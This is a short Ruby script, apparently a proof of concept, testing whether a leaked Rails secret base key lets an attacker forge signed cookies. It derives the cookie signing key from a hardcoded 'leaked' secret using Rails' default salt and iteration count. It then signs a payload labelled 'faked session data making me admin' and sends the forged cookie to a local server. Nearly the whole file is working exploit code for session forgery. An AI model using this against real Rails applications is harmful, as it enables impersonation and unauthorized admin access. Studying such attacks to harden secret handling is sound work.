# If we have the secret base key, can we forge signed cookies and decrypt
# encypted cookies?

require 'net/http'
require 'cgi'
require 'base64'
require 'openssl'
require 'active_support/all'

LEAKED_BASE_SECRET = 'cdc8441f641f565e967a0786bd31c50be6e7ea790e17c26ab7083bcb00d9a301c86dcd89c9d8585471a6c28322238682b6f2b4dc79cd4aab8a2627961faed43a'.freeze
# I think this value can be configured, if you can you'd have to go out of your
# way to do so
DEFAULT_SIGNED_COOKIE_SALT = 'signed cookie'.freeze
# This value can't be configured, it's hardcoded in the Rails source
RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS = 1000

def encode_and_sign(message, signing_secret:)
  # The inner encoding scheme (in this case, JSON) is configurable in
  #   config/initializers/cookies_serializer.rb
  # It defaults to JSON for new rails apps
  encoded_message = Base64.strict_encode64(ActiveSupport::JSON.encode(message))
  # The digest scheme (here, SHA1) is configurable but defaults to SHA1.
  signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get('SHA1').new,
                                      signing_secret,
                                      encoded_message)
  "#{encoded_message}--#{signature}"
end

# uri = URI('http://localhost:3000/set-cookies')
# response = Net::HTTP.get_response(uri)

# cookie_fields = response.get_fields('set-cookie')
# signed_cookie = cookie_fields.find do |cookie_field|
#   cookie_key = cookie_field.split('=')[0]
#   cookie_key == 'signed'
# end

# value_start_index = signed_cookie.index('=') + 1
# value_end_index = signed_cookie.index(';') - 1
# signed_cookie_value = signed_cookie[value_start_index..value_end_index]


key_generator = ActiveSupport::KeyGenerator.new(
  LEAKED_BASE_SECRET,
  iterations: RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS
)
cookie_signing_secret = key_generator.generate_key(DEFAULT_SIGNED_COOKIE_SALT)

malicious_value = 'faked session data making me admin'
malicious_cookie = encode_and_sign(malicious_value,
                                   signing_secret: cookie_signing_secret)

uri = URI('http://localhost:3000/show-cookies')
malicious_request = Net::HTTP::Get.new(uri)
malicious_request['Cookie'] = "signed=#{malicious_cookie}"

response = nil
Net::HTTP.start(uri.host, uri.port) do |http|
  response = http.request(malicious_request)
end

puts "Sending cookie: #{malicious_cookie}"
puts ''
p response.body
